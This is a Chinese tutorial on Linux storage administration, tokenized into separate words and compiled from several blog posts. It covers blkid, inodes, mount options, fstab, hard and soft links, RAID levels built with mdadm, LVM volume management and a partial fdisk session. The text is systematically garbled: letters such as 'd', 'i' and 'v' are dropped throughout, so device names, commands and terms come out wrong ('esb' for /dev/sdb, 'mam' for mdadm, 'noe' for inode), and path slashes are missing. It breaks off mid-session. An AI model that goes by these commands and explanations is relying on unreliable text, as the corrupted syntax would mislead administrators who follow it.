","查看","文件系统","部分","资料","来自于","：","https",":","blog",".","csn",".","netqq","_","34870631","artcleetals","88872938","blk","：","查看","块","设备","属性","信息","[","root@noe1","~","]","#","blk","esb","1","esb","1",":","UUID","=","\"","OZC","7","Tc","-","r","1","R","0","-","tkB","-","KtAN","-","zVYK","-","k","3","zz","-","fVeAUU","\"","TYPE","=","\"","LVM","2","_","member","\"","【","磁盘","名称","】","【","UUID","】","【","磁盘","类型","】","这里","的","磁盘","类型","是","LVM","2","UUID","的","作用","：","UUID","为","系统","中的","存储","设备","提供","唯一","的","标识","字符串","，","不管","这个","设备","是什么","类型","的","。","如果","你","在","系统","中","添加","了","新的","存储","设备","如","硬盘","，","很可能","会","造成","一些","麻烦","，","比如说","启动","的","时候","因为","找不到","设备","而","失败","，","而","使用","UUID","则","不会","有","这样","的","问题","。","自动","分配","的","设备","名称","并非","总是","一致","的","，","它们","依赖于","启动","时","内核","加载","模块","的","顺序","。","如果","你","在","插入","了","USB","盘时","启动","了","系统","，","而","下次","启动","时","又","把","它","拔掉","了","，","就","有可能","导致","设备","名","分配","不一致","。","ubuntu","中的","许多","关键","功能","现在","开始","依赖","于","UUID","，","例如","grub","─","─","系统","引导","程序","Inoe","​","日常","在","硬盘","需要","保存","的","数据","实在","太多","了","，","因此","Lnux","系统","中","有","一个","名为","super","block","的","“","硬盘","地图","”","。","Lnux","并","不是","把","文件","内容","直接","写入","到","这个","“","硬盘","地图","”","里面","，","而是","在里面","记录","着","整个","文件系统","的","信息","。","因","为","如果","把","所","有的","文件","内容","都","写入","到","这里","面","，","它","的","体积","将","变得","非常","大","，","而且","文件","内容","的","查询","与","写入","速度","也","会","变","得很","慢","。","Lnux","只是","把","每个","文件","的","权限","与","属性","记录","在","noe","中","，","而且","每个","文件","占用","一个","独立的","noe","表格","，","该","表格","的","大小","默认","为","128","字节","，","里面","记录","着","如下","信息","：","➢","该","文件","的","访问","权限","（","rea","、","wrte","、","execute","）","；","➢","该","文件","的","所有者","与","所属","组","（","owner","、","group","）","；","➢","该","文件","的","大小","（","sze","）","；","➢","该","文件","的","创建","或","内容","修改","时间","（","ctme","）","；","➢","该","文件","的","最后","一次","访问","时间","（","atme","）","；","➢","该","文件","的","修改","时间","（","mtme","）","；","➢","文件","的","特殊","权限","（","SUID","、","SGID","、","SBIT","）","；","➢","该","文件","的","真实","数据","地址","（","pont","）","。","mount","挂载","如果","是","临时","挂载","，","则","需要","mount","esb","1","test","，","这样","挂","载重","启","后","就","会","消失","。","想要","永久","挂载则","需要","更改","etcfstab","中的","信息","。","#","mount",":","显示","当前","已经","挂载","的","设备","[","root@noe1","~","]","#","mount","tal","-","n","2","emapperV","1","-","LV","1","on","appata","type","ext","4","(","rw",",","relatme",",","ata","=","orere",")","emapperV","1","-","thrBack","on","tmpthrUp","type","ext","4","(","ro",",","relatme",",","ata","=","orere",")","常用","选项","：","-","t","：","指名","要挂载","设备","上","的","文件系统","类型","-","r","：","reaonly","，","以","只读","的","方式","挂载","-","w","：","不","更新","etcmtab","-","L","：","“","Label","”","：","以","卷","标","指定","挂载","设备","-","U","：","“","UUID","”","：","以","UUID","指定","挂载","设备","-","B","：","绑定","目录","到","另一个","目录","上","使用","-","o","参数","挂载时","，","可以","去","定义","挂","载文","件","系统","的","选项","-","o","，","-","-","optonlst","async",":","异步","模式","sync",":","同步","模式","atmemoatme","：","包含","目录","和","文件","ratmemoratme","：","目录","的","访问","时间","戳","autonoauto","：","是否","支持","自动","挂载","execnoexec","：","是否","支持","将","文件系统","上","的","应用程序","运行","为","进程","enoe","：","是否","支持","在","此","文件系统","上","使用","设备","文件","sunou","：","是否","支持","在","此","文件系统","上","使用","u","标识","remount","：","重新","挂载","ro","：","rw","usernouser","：","是否","允许","普通用户","挂载","此","设备","acl","：","启用","此","文件系统","上","的","ACL","功能","默认","挂载","选项","：","efaults","rw",",","su",",","e",",","exec",",","auto",",","nouser",",","async","#","以","只读","的","形式","挂载","[","root@noe1","~","]","#","mount","-","o","ro","esb","3","test","[","root@noe1","test","]","#","cat","procmounts","关于","etcfstab","中的","文件","含义","：","[","root@noe1","~","]","#","cat","etcfstab","#","etcfstab","#","Create","by","anacona","on","Thu","Aug","15","02",":","51",":","10","2019","#","#","Accessble","flesystems",",","by","reference",",","are","mantane","uner","'","esk","'","#","See","man","pages","fstab","(","5",")",",","fnfs","(","8",")",",","mount","(","8",")","anor","blk","(","8",")","for","more","nfo","#","emappercentos","-","root","xfs","efaults","0","0","UUID","=","b","883","fe","76","-","ef","59","-","4","a","95","-","bf","91","-","b","37266","c","87","f","boot","xfs","efaults","0","0","emappercentos","-","swap","swap","swap","efaults","0","0","【","设备","文件","】","【","挂载","目录","】","【","格式","类型","】","【","权限","选项","】","【","是否","备份","】","【","是否","自检","】","字段","意义","设备","文件","一","般","为","设","备","的","路","径","+","设","备","名","称","，","也","可","以","写","唯","一","识","别","码","（","UUID","，","Unersally","Unque","Ientfer","）","挂载","目录","指定","要挂载","到","的","目录","，","需","在","挂载","前","创建","好","格式","类型","指定","文件系统","的","格式","，","比如","Ext","3","、","Ext","4","、","XFS","、","SWAP","、","so","9660","（","此","为","光盘","设备","）","等","权限","选项","若","设置","为","efaults","，","则","默认","权限","为","：","rw",",","su",",","e",",","exec",",","auto",",","nouser",",","async","是否","备份","若","为","1","则","开机","后","使用","ump","进行","磁盘","备份","，","为","0","则","不备","份","是否","自检","若","为","1","则","开机","后","自动","进行","磁盘","自检","，","为","0","则","不","自检","卸载","：","umount","esb","1","。","如果","卸载","的","时候","卡","死","，","可以","试","着","用这","条","命令","：","fuser","-","m","-","k","esb","1","fuser","使用","手册","：","https",":","pcmen",".","comfuser","yum","nstall","psmsc","软硬","链接","硬","链接","：","可以","将它","理解","为","一个","“","指向","原始","文件","noe","的","指针","”","，","系统","不","为","它","分配","独立的","noe","和","文件","。","所以","，","硬","链接","文件","与","原始","文件","其实","是","同一个","文件","，","只","是","名字","不同","。","我们","每","添加","一个","硬","链接","，","该","文件","的","noe","连接","数","就","会","增加","1","；","而且","只","有","当","该","文件","的","noe","连接","数","为","0","时","，","才","算","彻底","将它","删除","。","换言之","，","由于","硬","链接","实际上","是","指向","原文件","noe","的","指针","，","因此","即便","原始","文件","被","删除","，","依然","可以","通过","硬","链接","文件","来访","问","。","需要","注意的","是","，","由于","技术","的","局限性","，","我们","不能","跨","分区","对","目录","文件","进行","链接","。","软","链接","（","也","称为","符号","链接","）","：","仅仅","包含","所","链接","文件","的","路径","名","，","因此","能","链接","目录","文件","，","也","可以","跨越","文件系统","进行","链接","。","但是","，","当","原始","文件","被","删除","后","，","链接","文件","也","将","失效","，","从这一点","上来","说","与","Wnows","系统","中的","“","快捷","方式","”","具有","一样","的","性质","。","命令","–","ln","，","格式","为","ln","[","选项","]","目标","参数","作用","-","s","创建","“","符号","链接","”","（","如果","不","带","-","s","参数","，","则","默认","创建","硬","链接","）","-","f","强制","创建","文件","或","目录","的","链接","-","覆盖","前","先","询问","-","显示","创建","链接","的","过程","创建","两个","代表","软硬","链接","的","文件夹","，","之后","的","测试","就","在","这","两个","文件夹","中","进行","[","root@noe1","ffLnks","]","#","mkr","-","p","&","#","123",";","symbolc",",","har","&","#","125",";","准备","两个","文本","[","root@noe1","ffLnks","]","#","echo","\"","ths","s","symbolc","text","\"","symbolcs",".","txt","[","root@noe1","ffLnks","]","#","echo","\"","ths","s","har","text","\"","harh",".","txt","[","root@noe1","ffLnks","]","#","tree",".","├","─","─","har","│","└","─","─","h",".","txt","└","─","─","symbolc","└","─","─","s",".","txt","2","rectores",",","2","fles","软","链接","[","root@noe1","ffLnks","]","#","ln","-","s","symbolcs",".","txt","sym",".","lnk","硬","链接","[","root@noe1","ffLnks","]","#","ln","harh",".","txt","ha",".","lnk","可以","看到","现在","两个","链接","都","可以","正常","查看","[","root@noe1","ffLnks","]","#","cat","sym",".","lnk","ths","s","symbolc","text","[","root@noe1","ffLnks","]","#","cat","ha",".","lnk","ths","s","har","text","现在","删除","两个","链接","的","源文件","[","root@noe1","ffLnks","]","#","rm","symbolcs",".","txt","-","f","[","root@noe1","ffLnks","]","#","rm","harh",".","txt","-","f","之后","软","链接","就","不可以","查看","了","，","硬","链接","还是","可以","查看","，","软","链接","有点","像","wnows","中的","快捷","方式","，","硬","链接","有点","像是","复制","，","但","这里","需要","知道","Lnux","文件","删除","的","本质","是什么","？","？","？","[","root@noe1","ffLnks","]","#","cat","sym",".","lnk","cat",":","sym",".","lnk",":","No","such","fle","or","rectory","[","root@noe1","ffLnks","]","#","cat","ha",".","lnk","ths","s","har","text","RAID","阵列","文章","摘录","于","：","https",":","blog",".","csn",".","nettanlesoftwareartcleetals","5429634","RAID","（","Reunant","Arrays","of","Inepenent","Dsks","）","，","独立","磁盘","冗余","阵列","，","简称","磁盘阵列","。","磁盘阵列","分为","两种","：","软","阵列","（","Software","Ra","）","和","硬","阵列","（","Harware","Ra","）","两种","。","软","阵列","：","即","通过","软件","程序","并","由","计算机","CPU","提供","运行","能力","所","构成","，","由于","软件","程式","不是","一个","完整","系统","，","故","只","能","提供","最","基本的","RAID","容错","功能","，","其他","如","热","备用","硬盘","的","设置","，","远程管理","等","功能","均","没有","硬","阵列","：","是","由","独立","操作系统","的","硬件","提供","整个","磁盘阵列","的","控制","和","计算","功能","，","不依","靠","系统","的","CPU","资源","，","由于","硬","阵列","是","一个","完整的","系统","，","所有","需要","的","功能","均可","以","做","进去","，","所以","硬","阵列","所","提供","的","功能","和","性能","均","比","软","阵列","好","。","如果","你想","把","系统","也","做到","磁盘阵列","中","，","硬","阵列","是","唯一","的","选择","，","故我","们","在","市场","上","RAID","5级","的","磁盘阵列","均","为","硬","阵列","，","软","阵列","只","适用","于","RAID","0","和","RAID","1","要","使用","磁盘","RAID","主要","有","两种","方式","，","一种","就是","RAID","适配卡","，","通过","RAID","适配卡","插入","PCI","插槽","，","再接","上","硬盘","实现","RAID","功能","。","第二种","方式","就是","直接","在","主板","上集","成","RAID","控制","芯片","，","让","主板","能","直接","实现","磁盘","RAID","。","RAID","0条","带","化","（","Strpe","）","存储",",","即","Data","Strppng","数据","分","条","技术","。","RAID","0","可以","把","多","块","硬盘","连成","一个","容量","更大","的","硬盘","群","，","可以","提高","磁盘","的","性能","和","吞吐量","。","RAID","0","没有","冗余","或","错误","修复","能力","，","成本","低","，","要求","至少","两个","磁盘","，","一般","只是","在","那些","对","数据","安全性","要求","不","高的","情况","下","才","被","使用","。","RAID","0","连续","以","位","或","字节","为","单位","分割","数据","，","并行","读写","于多","个","磁盘","上","，","在","所有","的","级别","中","，","RAID","0","的","速度","是","最快的","。","理论上","说","，","有","N","个","磁盘","组成","的","RAID","0","是","单个","磁盘","读写","速度","的","N","倍","。","但是","RAID","0","没有","冗余","功能","的","，","如果","一个","磁盘","（","物理","）","损坏","，","则","所有","的","数据","都","无法","使用","。","因此","并","不能","算是","真正","的","RAID","结构","。","（","1","）","、","RAID","0","最","简单","方式","就是","把","N","块","同样","的","硬盘","用","硬件","的","形式","通过","智能","磁盘","控制器","或","用","操作系统","中的","磁盘","驱动程序","以","软件","的","方式","串联","在一起","，","形成","一个","独立的","逻辑","驱动器","，","容量","是","单独","硬盘","的","N","倍",",","在","电脑","数据","写","时","被","依次","写入","到","各","磁盘","中","，","当","一块","磁盘","的","空间","用尽","时","，","数据","就","会","被","自动","写入","到","下","一块","磁盘","中","，","它","的","好处","是","可以","增加","磁盘","的","容量","。","速度","与","其中","任何","一块","磁盘","的","速度","相同","，","如果","其","中的","任何","一块","磁盘","出现","故障","，","整个","系统","将会","受到","破坏","，","可靠性","是","单独","使用","一块","硬盘","的","1","n","。","（","2","）","、","RAID","0","的","另一","方式","是","用","N","块","硬盘","选择","合理的","带","区","大小","创建","带","区集","，","最好","是","为","每一块","硬盘","都","配备","一个","专门","的","磁盘","控制器",",","在","电脑","数据","读写","时","同时","向","N","块","磁盘","读写","数据",",","速度","提升","n","倍","。","提高","系统","的","性能","。","RAID","1","RAID","1","会","将","数据","储存","两份","，","称之为","镜","像","(","Mrror",")","存储","。","提高","了","可靠性","，","但","磁盘","利用率","50%","，","也就是说","，","两块","10","G","的","磁盘","组成","RAID","1","，","最后","磁盘","容量","也","只有","10","G","。","RAID","1","是","磁盘阵列","中","单位成本","最高的","，","但","提供","了","很","高的","数据","安全性","和","可用性","。","当","一个","磁盘","失效","时","，","系统","可以","自动","切换","到","镜","像","磁盘","上","读写","，","而","不需要","重组","失效","的","数据","。","RAID","3","奇偶","校验","（","XOR","）","条带","存储","，","共享","校验","盘","，","数据","条带","存储","单位","为","字节","。","RAID","3","是以","一个","硬盘","来","存放","数据","的","奇偶","校验位","，","数据","则","分段","存储","于","其余","硬盘","中","。","它","象","RAID","0一样","以","并行","的","方式","来","存放","数","，","但","速度","没","有","RAID","0","快","。","如果","数据","盘","（","物理","）","损坏","，","只要","将","坏","硬盘","换","掉","，","RAID","控制系统","则","会","根据","校验","盘","的","数据","校验位","在","新","盘","中","重建","坏","盘","上","的","数据","。","不过","，","如果","校验","盘","（","物理","）","损坏","的话","，","则","全","部","数据","都","无法","使用","。","利用","单独","的","校验","盘","来","保护","数据","虽然","没有","镜","像","的","安全性","高","，","但是","硬盘","利用率","得","到了","很大的","提高","，","为","n","-","1","。","RAID","3","对于","大量","的","连续","数据","可","提供","很好","的","传输","率","，","但","对于","随机","数据","来说","，","奇偶","盘","会","成为","写","操作","的","瓶颈","。","RAID","5","奇偶","校验","（","XOR","）","条带","存储","，","校验","数据","分布式","存储","，","数据","条带","存储","单位","为","块","。","RAID","5","不单","独","指定","的","奇偶","盘","，","而是","在","所有","磁盘","上","交叉","地","存取","数据","及","奇偶校验","信息","。","在","RAID","5","上","，","读写","指针","可","同时","对阵","列","设备","进行","操作","，","提供","了","更高","的","数据","流量","。","RAID","5","更","适合于","小","数据","块","和","随机","读写","的","数据","。","RAID","3","与","RAID","5","相比","，","最主要","的","区别","在于","RAID","3","每","进行","一次","数据传输","就","需","涉及到","所有","的","阵列","盘","；","而","对于","RAID","5","来说","，","大","部分","数据传输","只","对","一块","磁盘","操作","，","并","可","进行","并行","操作","。","在","RAID","5","中","有","“","写","损失","”","，","即","每一次","写","操作","将","产生","四个","实际","的","读写","操作","，","其中","两次","读","旧的","数据","及","奇偶","信息","，","两次","写","新的","数据","及","奇偶","信息","。","RAID","5","把","校验","块","分散","到","所","有的","数据","盘","中","。","它","使用","了","一种","特殊的","算法","，","可以","计算出","任何","一个","带","区","校验","块","的","存放","位置","。","这样","就","可以","确保","任何","对","校验","块","进行","的","读写","操作","都会","在","所","有的","RAID","磁盘","中","进行","均衡","，","从而","消除","了","产生","瓶颈","的","可能","。","RAID","5","的","读出","效率","很","高","，","写入","效率","一般","，","块","式","的","集体","访问","效率","不错","。","RAID","5","提高","了","系统","可靠性","，","但","对","数据传输","的","并行","性","解决","不好","，","而且","控制器","的","设计","也","相当","困难","。","为了","具有","RAID","-","5级","的","冗余","度","，","需要","最少","由","三个","磁盘","组成","的","磁盘阵列","（","不包括","一个","热","备用","）","。","RAID","-","5","可以","通过","磁盘阵列","控制器","硬件","实现","，","也","可以","通过","某些","网络","操作","系统软件","实现","了","。","硬盘","的","利用率","为","n","-","1","。","当","进行","恢复","时","，","比如","我们","需要","需要","恢复","下图","中的","A","0","，","这里","就","必须","需要","B","0","、","C","0","、","D","0","加","0","party","才能","计算","并","得出","A","0","，","进行","数据","恢复","。","所以","当","有","两块","盘","坏掉","的","时候","，","整个","RAID","的","数据","失效","。","RAID","10","和","RAID","011","、","RAID","10","是","先","做","条带","再做","镜","像","。","这种情况","中","，","我们","假设","当","DISK","0","损坏","时","，","在","剩下","的","3块","盘","中","，","只","有","当","DISK","1一个","盘","发生","故障","时","，","才","会","导致","整个","RAID","失效","，","我们","可","简单","计算","故障率","为","13","。","2","、","RAID","01","是","先","做","备份","在","做","条带","。","这种情况","下","，","我们","仍然","假设","DISK","0","损坏","，","这时","左边","的","条带","将","无法","读取","。","在","剩下","的","3块","盘","中","，","只要","DISK","2","，","DISK","3","两个","盘","中","任何","一个","损坏","，","都会","导致","整个","RAID","失效","，","我们","可","简单","计算","故障率","为","23","。","因此","，","RAID","10","比","RAID","01","在","安全性","方面","要强","​","从","数据","存储","的","逻辑","位置","来看","，","在","正常的","情况","下","RAID","01","和","RAID","10","是","完全","一样","的","，","而且","每一个","读写","操作","所","产生","的","IO","数量","也是","一样","的","，","所以","在读","写","性能","上","两者","没什么","区别","。","而","当","有","磁盘","出现","故障","时","，","比如","前面","假设","的","DISK","0","损坏","时","，","我们","也","可以","发现","，","这","两种","情况","下","，","在读","的","性能","上面","也","将","不同","，","RAID","10","的","读","性能","将","优于","RAID","01","。","把","RAID","0","和","RAID","1","技术","结合","起来","，","数据","除","分布","在","多","个","盘","上","外","，","每个","盘","都","有","其","物理","镜","像","盘","，","提供","全","冗余","能力","，","允许","一个","以下","磁盘","故障","，","而","不","影响","数据","可用性","，","并","具有","快速","读写","能力","。","RAID","0","+","1","要","在","磁盘","镜","像","中","建立","带","区集","至少","4个","硬盘","。","命令行","实现","格式","为","“","mam","[","模式","]","RAID","设备","名称","[","选项","]","[","成员","设备","名称","]","”","。","参数","作用","-","a","检测","设备","名称","-","n","指定","设备","数量","-","l","指定","RAID","级别","-","C","创建","-","显示","过程","-","f","模拟","设备","损坏","-","r","移","除","设备","-","Q","查看","摘要","信息","-","D","查看","详细","信息","-","S","停止","RAID","磁盘阵列","[","root@localhost","~","]","#","yum","-","y","nstall","mam","[","root@localhost","~","]","#","cat","procparttons","major","mnor","#","blocks","name","8","0","20971520","sa","8","1","1048576","sa","1","8","2","19921920","sa","2","8","16","20971520","sb","8","48","20971520","s","8","64","20971520","se","8","32","20971520","sc","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","more","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","[","root@localhost","~","]","#","mam","-","C","em","0","-","a","yes","-","n","4","-","l","10","esb","esc","es","esemam",":","layout","efaults","to","n","2","mam",":","layout","efaults","to","n","2","mam",":","chunk","sze","efaults","to","512","K","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","more","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","C","参数","代表","创建","一个","RAID","阵列","卡","；","-","参数","显示","创建","的","过程","，","同时","在后面","追加","一个","设备","名称","em","0",",","这样","em","0","就是","创建","后","的","RAID","磁盘阵列","的","名称","；","-","a","yes","参数","代表","自动","创建","设备","文件","；","-","n","4","参数","代表","使用","4","块","硬盘","来","部署","这个","RAID","磁盘阵列","；","-","l","10","参数","则","代表","RAID","10","方案","；","最后","再加上","4","块","硬盘","设备","的","名称","就","搞定","了","。","将","制作","好的","RAID","磁盘阵列","格式","化为","ext","4","格式","[","root@localhost","~","]","#","mkfs",".","ext","4","em","0","mke","2","fs","1.42.9","(","28","-","Dec","-","2013",")","Flesystem","label","=","OS","type",":","Lnux","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","more","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","将","制作","好的","磁盘","挂载","到","目录","，","并","查看","属性","信息","[","root@localhost","~","]","#","mkr","RAID","[","root@localhost","~","]","#","mount","em","0","RAID","[","root@localhost","~","]","#","f","-","h","RAIDFlesystem","Sze","Use","Aal","Use","%","Mounte","onem","0","40","G","49","M","38","G","1%","rootRAID","四个","硬盘","，","每个","20","G","，","为什么","sze","是","40","G","呢","？","因为","一半","用来","高速","存储","，","一半","用来","数据","备份","了","。","查看","em","0","磁盘阵列","的","详细信息","[","root@localhost","~","]","#","mam","-","D","em","0","em","0",":","Verson",":","1.2","Creaton","Tme",":","Tue","Aug","13","15",":","37",":","47","2019","Ra","Leel",":","ra","10","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","more","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","并把","挂载","信息","写入","到","配置文件","中","，","使","其","永久","生效","。","[","root@localhost","~","]","#","echo","\"","em","0","rootRAID","ext","4","efaults","0","0","\"","etcfstab","LVM","部分","摘录","于","相关","文章","：","https",":","www",".","cnblogs",".","commooxp","11163229",".","html","https",":","blog",".","51","cto",".","com","136914772299707","https",":","blog",".","51","cto",".","comwuyelan","1540859","https",":","www",".","thegeekary",".","comlm","-","error","-","cant","-","open","-","esx","-","exclusely","-","mounte","-","flesystem","http",":","www",".","laojl",".","comblogece","-","esb","-","exclue","-","by","-","a","-","flter","​","许多","Lnux","使用者","安装","操作系统","时","都会","遇到","这样","的","困境","：","如何","精确","评估","和","分配","各个","硬盘分区","的","容量","，","如果","当初","评估","不","准确","，","一旦","系统","分区","不够","用时","可能","不得不","备份","、","删除","相关","数据","，","甚至","被迫","重新","规划","分区","并","重装","操作系统","，","以","满足","应用","系统","的","需要","。","​","LVM","是","Lnux","环境","中","对","磁盘分区","进行","管理","的","一种","机制","，","是","建立","在","硬盘","和","分区","之上","、","文件系统","之下","的","一个","逻辑","层","，","可","提高","磁盘分区","管理","的","灵活性","。","RHEL","5","默认","安装","的","分区","格式","就是","LVM","逻辑","卷","的","格式","，","需要","注意的","是","boot","分区","不能","基于","LVM","创建","，","必须","独立","出来","。","原理","解析","要想","理解","好","LVM","的","原理","，","我们","必须","首先","要","掌握","4个","基本的","逻辑","卷","概念","。","①","PE","(","Physcal","Exten",")","物理","拓展","②","PV","(","Physcal","Volume",")","物理","卷","③","VG","(","Volume","Group",")","卷","组","④","LV","(","Logcal","Volume",")","逻辑","卷","1",".","将","我们","的","物理","硬盘","格式","化成","PV","(","Physcal","Volume",")","​","我们","看到","，","这里","有","两块","硬盘","，","一块","是","sa","，","另一块","是","sb","，","在","LVM","磁盘","管理","里","，","我","首先","要","将","这","两块","硬盘","格式化","为","我们","的","PV","(","Physcal","Volume",")",",","也就是","我们","的","物理","卷","，","其实","格式化","物理","卷","的","过程","中","LVM","是","将","底层","的","硬盘","划分","为了","一个一个","的","PE","(","Physcal","Exten",")",",","我们","的","LVM","磁盘","管理","中","PE","的","默认","大小","是","4","M","大小","，","其实","PE","就是","我们","逻辑","卷","管理","的","最","基本单位","。","比如说","我","有","一个","400","M","的","硬盘","，","那么","在","将","其","格式化","成","PV","的","时候","，","其","实际","就是","将","这","块","物理","硬盘","划","分成","了","100个","的","PE","，","因为","PE","默认","的","大小","就是","4","M","。","这个","就是","我们","的","第一步","操作","。","2",".","创建","一个","VG","(","Volume","Group",")","​","在","将","硬盘","格式化","成","PV","以后","，","我们","第二步","操作","就是","创建","一个","卷","组","，","也就是","VG","(","Volume","Group",")",",","卷","组","在","这里","我们","可以","将","其","抽象","化成","一个","空间","池","，","VG","的","作用","就是","用来","装","PE","的","，","我们","可以","把","一个","或者","多","个","PV","加","到","VG","当中","，","因为","在","第一步","操作","时","就","已经","将","该","硬盘","划","分成","了","多","个","PE","，","所以","将","多","个","PV","加","到","VG","里面","后","，","VG","里面","就","存放","了","许许多多","来自","不同","PV","中的","PE","，","我们","通过","上面","的","图片","就","可以","看到","，","我们","格式化","了","两块","硬盘","，","每个","硬盘","分别","格式","化成","了","3个","PE","，","然后","将","两块","硬盘","的","PE","都","加","到了","我们","的","VG","当中","，","那么","我们","的","VG","当中","就","包含","了","6个","PE","，","这","6个","PE","就是","两个","硬盘","的","PE","之和","。","通常","创建","一个","卷","组","的","时候","我们","会","为","其","取","一个","名字","，","也就是","该","VG","的","名字","。","3",".","基于","VG","创建","我们","最后","要","使用","的","LV","(","Logcal","Volume",")","​","【","注意","】","PV","以及","VG","创建","好","以后","我们","是","不能","够","直接","使用","的","，","因为","PV","、","VG","是","我们","逻辑","卷","底层","的","东西","，","我们","其实","最后","使用","的","是","在","VG","基础上","创建","的","LV","(","Logcal","Volume",")",",","所以","第三步","操作","就是","基于","VG","来","创建","我们","最终","要","使用","的","LV","。","​","当","我们","创建","好","我们","的","VG","以后","，","这个时候","我们","创建","LV","其实","就是","从","VG","中","拿出","我们","指定","数量","的","PE","，","还是","拿","上图","来说","，","我们","看到","我们","此时","的","VG","里面","已经","拥有","了","6个","PE","，","这时候","我们","创建","了","我们","的","第","一个","逻辑","卷","，","它","的","大小","是","4个","PE","的","大小","，","也就是","16","M","(","因为","一个","PE","的","默认","大小","是","4","M",")","，","而","这","4个","PE","有","三个","是","来自于","第","一块","硬盘","，","而","另外","一个","PE","则","是","来自","第二块","硬盘","。","当","我们","创建","第二个","逻辑","卷","时","，","它","的","大小","就","最多","只","有","两个","PE","的","大小","了","，","因为","其","中的","4个","PE","已经","分","配给","了","我们","的","第","一个","逻辑","卷","。","​","所以","创建","逻辑","卷","其实","就是","我们","从","VG","中","拿出","我们","指定","数量","的","PE","，","VG","中的","PE","可以","来自","不同的","PV","，","我们","可以","创建","的","逻辑","卷","的","大小","取决于","VG","当中","PE","存在","的","数量","，","并且","我们","创建","的","逻辑","卷","其","大小","一定","是","PE","的","整数","倍","(","即","逻辑","卷","的","大小","一定","要是","4","M","的","整数","倍",")","。","4",".","将","我们","创建","好的","LV","进行","文件系统","的","格式化","，","然后","挂载","使用","​","在","创建","好","LV","以后","，","这个时候","我们","就","能够","对","其","进行","文件系统","的","格式化","了","，","我们","最终","使用","的","就是","我们","刚","创建","好的","LV","，","其","就","相当于","传统","的","文件","管理","的","分区","，","我们","首先","要","对","其","进行","文件系统","的","格式化","操作","，","然后","通过","mount","命令","对","其","进行","挂载","，","这个时候","我们","就","能够","像","使用","平常的","分区","一样","来","使用","我们","的","逻辑","卷","了","。","​","我们","在","创建","好","LV","以后","，","我们","会","在","e","目录","下","看到","我们","的","LV","信息","，","例如","egnamelname","，","我们","每","创建","一个","VG","，","其","会","在","e","目录","下","创建","一个","以","该","VG","名字","命名","的","文件夹","，","在","该","VG","的","基础上","创建","好","LV","以后","，","我们","会","在","这个","VG","目录","下","多","出","一个","以","LV","名字","命名","的","逻辑","卷","。","命令","整理","命令","含义","fsk","查看","磁盘","信息","pcreate","esb","1","esc","1","创建","PV","物理","卷","psplay","查看","物理","卷","详细","信息","ps","查看","物理","卷","摘要","信息","gcreate","VG","1","esb","1","esc","1","创建","卷","组","（","Volume","gsplay","查看","所有","卷","组","的","详细信息","gs","查看","卷","组","的","摘要","信息","lcreate","-","n","LV","1","-","L","1","G","VG","1","创建","逻辑","卷","各","参数","含义","：","-","n","：","表示","创建","逻辑","卷","名","-","L","：","表示","分配","逻辑","卷","的","大小","VG","1","：","表示","在","卷","组","VG","1","上","创建","逻辑","卷","LV","1","命令","含义","ls","显示","逻辑","卷","的","信息","lsplay","显示","逻辑","卷","的","详细","信息","mke","2","fs","-","t","ext","4","eVG","1","LV","1","格式化","物理","卷","mount","eVG","1","LV","1","rootlm","1","挂载","，","可","以","再","etcfstab","中","永久","挂载","gexten","VG","1","es","1","扩容","卷","组","容量","，","把","物理","卷","加入","卷","组","lexten","-","L","+","2","G","eVG","1","LV","1","扩容","逻辑","卷","LV","1","，","增加","2","G","容量","resze","2","fs","eVG","1","LV","1","确认","增加","容量","e","2","fsck","-","f","eVG","1","LV","1","强制","检查","LV","1","逻辑","卷","，","需","先","卸载","resze","2","fs","eVG","1","LV","1","1","G","缩减","逻辑","卷","，","-","1","G","表示","缩减","1","G","大小","，","1","G","表示","缩减","到","1","G","lreuce","-","L","1","G","eVG","1","LV","1","再","进行","逻辑","卷","的","LV","容量","的","缩减","pmoe","esb","1","将","sb","1","磁盘分区","的","数据","转移","到","其他","盘","上","greuce","VG","1","esb","1","把","sb","1","从","VG","1卷","组","中","移","除","premoe","esb","1","把","sb","1","分区","从","PV","物理","卷","中","释放","出来","lcreate","-","L","20","M","-","n","backup","-","s","-","p","r","eV","1","LV","1","备份","逻辑","卷","LV","1","lremoe","eV","1","backup","删除","逻辑","卷","的","备份","内核","要求","LVM","1","版本","需要","2.4","及","以后","的","内核","支持","；","LVM","2","需要","2.6","及","以后","的","内核","版本","支持","。","[","root@noe1","LG","]","#","cat","etcrehat","-","release","CentOS","Lnux","release","7.7.1908","(","Core",")","[","root@noe1","LG","]","#","uname","-","r","3.10.0","-","1062.1.2",".","el","7",".","x","86","_","64","磁盘分区","添加","两块","磁盘","，","分","别","为","：","esb","和","esc","，","分","别","对","sb","和","sc","进行","分区","。","sb","的","分区","是","：","两个","主","分区","sc","的","分区","是","：","一个","主","分区","和","一个","扩展","分区","，","其中","扩展","分区","有","分出","了","逻辑","分区","第一块","磁盘","esb","分区","：","创建","两个","主","分区","[","root@noe1","~","]","#","fsk","esbWelcome","to","fsk","(","utl","-","lnux","2.23.2",")",".","Comman","(","m","for","help",")",":","nPartton","type",":","p","prmary","(","0","prmary",",","0","extene",",","4","free",")","e","exteneSelect","(","efault","p",")",":","p","#","主","分区","Usng","efault","response","pPartton","number","(","1","-","4",",","efault","1",")",":","Frst","sector","(","2048","-","41943039",",","efault","2048",")",":","Usng","efault","alue","2048","Last","sector",",","+","sectors","or","+","sze","&","#","123",";","K",",","M",",","G","&","#","125",";","(","2048","-","41943039",",","efault","41943039",")",":","+","5","GPartton","1","of","type","Lnux","an","of","sze","5","GB","s","setComman","(","m","for","help",")",":","nPartton","type",":","p","prmary","(","1","prmary",",","0","extene",",","3","free",")","e","exteneSelect","(","efault","p",")",":","p","#","第","一块","磁盘","划分","两个","主","分区","Usng","efault","response","pPartton","number","(","2","-","4",",","efault","2",")",":","Frst","sector","(","10487808","-","41943039",",","efault","10487808",")",":","Usng","efault","alue","10487808","Last","sector",",","+","sectors","or","+","sze","&","#","123",";","K",",","M",",","G","&","#","125",";","(","10487808","-","41943039",",","efault","41943039",")",":","Usng","efault","alue","41943039","Partton","2","of","type","Lnux","an","of","sze","15